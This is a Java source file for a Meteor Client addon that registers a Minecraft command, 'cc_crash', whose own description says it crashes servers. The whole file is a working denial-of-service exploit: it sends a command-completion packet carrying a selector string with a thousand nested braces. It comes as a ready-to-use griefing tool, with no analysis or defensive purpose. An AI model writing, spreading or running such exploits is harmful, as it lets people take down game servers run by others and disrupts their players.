package addon.antip2w.commands;

import addon.antip2w.utils.MCUtil;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class CommandCompleteCrash extends Command {
    public CommandCompleteCrash() {
        super("cc_crash", "Command Complete Crash - crashes servers using a magic packet");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            MCUtil.sendPacket(new RequestCommandCompletionsC2SPacket(
                -1, "/msg @a[nbt=" + "{a:".repeat(1000) + "}".repeat(1000) + "]"
            ));
            return com.mojang.brigadier.Command.SINGLE_SUCCESS;
        });
    }
}
